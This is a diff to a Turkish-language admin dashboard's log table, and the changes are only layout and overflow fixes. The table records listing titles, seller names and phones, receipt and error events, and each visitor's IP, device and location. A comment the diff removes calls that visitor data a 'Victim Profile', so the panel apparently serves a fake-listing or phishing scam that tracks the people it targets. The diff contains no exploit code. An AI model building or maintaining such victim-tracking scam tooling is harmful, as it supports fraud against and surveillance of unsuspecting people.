@@ -1362,7 +1362,7 @@
     </div>
 
     <div id="loglar" class="tab-content">
-        <!-- YENİ: LOG FİLTRELERİ -->
+        <!-- LOG FİLTRELERİ -->
         <div class="log-filters" style="display: flex; gap: 10px; margin-bottom: 15px; overflow-x: auto; padding-bottom: 5px;">
             <button class="log-filter-btn active" onclick="filterLogs('all', this)">Tümü</button>
             <button class="log-filter-btn" onclick="filterLogs('visit', this)">Ziyaretler</button>
@@ -1372,7 +1372,14 @@
         </div>
         
         <div class="table-container">
-            <table>
+            <table style="table-layout: fixed; width: 100%; min-width: 900px;">
+                <colgroup>
+                    <col style="width: 110px;">
+                    <col style="width: 220px;">
+                    <col style="width: 140px;">
+                    <col style="width: auto;">
+                    <col style="width: 180px;">
+                </colgroup>
                 <thead>
                     <tr>
                         <th>Tarih / Saat</th>
@@ -1833,7 +1840,6 @@
             window.location.href = "login.html"; 
         }
 
-        // 🔥 DİNAMİK API URL - CORS HATASI ÇÖZÜMÜ 🔥
         const API_BASE = window.location.hostname.includes('localhost') ? 'http://localhost:3000/api' : '/api'; 
         const headers = { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` };
         let globalIlanlar = []; 
@@ -2015,7 +2021,7 @@
             });
         };
 
-        // 🔥 YENİDEN DÜZENLENMİŞ ZENGİN LOG FONKSİYONU 🔥
+        // 🔥 LOG TABLOSU TAŞMA SORUNU ÇÖZÜMÜ 🔥
         async function loadLogs(gizli = false) {
             const tbody = document.getElementById('loglarTableBody'); 
             if (!gizli) tbody.innerHTML = getSkeletonRows(5);
@@ -2046,24 +2052,22 @@
                     if(actLow.includes("dekont") || actLow.includes("başarılı")) badgeClass = "badge-success"; 
                     if(actLow.includes("hata") || actLow.includes("yanlış") || actLow.includes("başarısız")) badgeClass = "badge-danger"; 
                     
-                    // Zengin İlan Bilgisi Kartı
-                    let ilanHtml = `<div style="display:flex; flex-direction:column; gap:4px;">
-                        <strong style="font-size:13px; color:var(--text-main);">${dezenfekteEt(data.ilanBasligi || 'Bilinmiyor')}</strong>`;
+                    let ilanHtml = `<div style="display:flex; flex-direction:column; gap:4px; overflow:hidden; text-overflow:ellipsis;">
+                        <strong style="font-size:13px; color:var(--text-main); white-space:nowrap; overflow:hidden; text-overflow:ellipsis;" title="${dezenfekteEt(data.ilanBasligi || 'Bilinmiyor')}">${dezenfekteEt(data.ilanBasligi || 'Bilinmiyor')}</strong>`;
                     if (data.saticiAdi) {
-                        ilanHtml += `<span style="font-size:11px; color:var(--text-muted); display:flex; align-items:center; gap:4px;"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg> ${dezenfekteEt(data.saticiAdi)}</span>`;
+                        ilanHtml += `<span style="font-size:11px; color:var(--text-muted); display:flex; align-items:center; gap:4px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;"><svg style="flex-shrink:0;" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg> ${dezenfekteEt(data.saticiAdi)}</span>`;
                     }
                     if (data.saticiTel) {
-                        ilanHtml += `<span style="font-size:11px; color:var(--text-muted); display:flex; align-items:center; gap:4px;"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg> ${dezenfekteEt(data.saticiTel)}</span>`;
+                        ilanHtml += `<span style="font-size:11px; color:var(--text-muted); display:flex; align-items:center; gap:4px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;"><svg style="flex-shrink:0;" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg> ${dezenfekteEt(data.saticiTel)}</span>`;
                     }
                     ilanHtml += `</div>`;
 
-                    // Kurban Profili (Cihaz/Konum/IP)
                     let cihazText = data.cihaz || data.os || "Cihaz Tespiti Bekleniyor";
                     let lokasyonText = data.lokasyon || "Lokasyon Çözümleniyor";
-                    let ipHtml = `<div style="display:flex; flex-direction:column; gap:6px;">
-                        <code style="background:var(--bg-body); padding:4px 8px; border-radius:6px; font-size:12px; color:var(--text-main); border:1px solid var(--border-color); width:fit-content; font-weight:600;">${dezenfekteEt(data.ip || 'IP Yok')}</code>
-                        <span style="font-size:11px; color:var(--text-muted); display:flex; align-items:center; gap:4px;"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect><line x1="12" y1="18" x2="12.01" y2="18"></line></svg> ${dezenfekteEt(cihazText)}</span>
-                        <span style="font-size:11px; color:var(--text-muted); display:flex; align-items:center; gap:4px;"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg> ${dezenfekteEt(lokasyonText)}</span>
+                    let ipHtml = `<div style="display:flex; flex-direction:column; gap:6px; overflow:hidden;">
+                        <code style="background:var(--bg-body); padding:4px 8px; border-radius:6px; font-size:12px; color:var(--text-main); border:1px solid var(--border-color); width:fit-content; font-weight:600; word-break: break-all;">${dezenfekteEt(data.ip || 'IP Yok')}</code>
+                        <span style="font-size:11px; color:var(--text-muted); display:flex; align-items:center; gap:4px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;"><svg style="flex-shrink:0;" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect><line x1="12" y1="18" x2="12.01" y2="18"></line></svg> ${dezenfekteEt(cihazText)}</span>
+                        <span style="font-size:11px; color:var(--text-muted); display:flex; align-items:center; gap:4px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;"><svg style="flex-shrink:0;" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg> ${dezenfekteEt(lokasyonText)}</span>
                     </div>`;
 
                     yeniHtml += `
@@ -2071,14 +2075,13 @@
                         <td><b style="color:var(--text-main);">${dezenfekteEt(data.tarih)}</b><br><small style="color:var(--text-muted); font-weight:600;">${dezenfekteEt(data.saat)}</small></td>
                         <td>${ilanHtml}</td>
                         <td><span class="log-badge ${badgeClass}">${dezenfekteEt(data.aksiyon)}</span></td>
-                        <td style="max-width:200px; line-height:1.4;">${dezenfekteEt(data.detay || '-')}</td>
+                        <td style="word-break: break-word; overflow-wrap: anywhere; line-height:1.4;">${dezenfekteEt(data.detay || '-')}</td>
                         <td>${ipHtml}</td>
                     </tr>`;
                 });
                 
                 tbody.innerHTML = yeniHtml;
                 
-                // Aktif filtreyi uygula
                 const activeFilterBtn = document.querySelector('.log-filter-btn.active');
                 if(activeFilterBtn) {
                     let type = 'all';
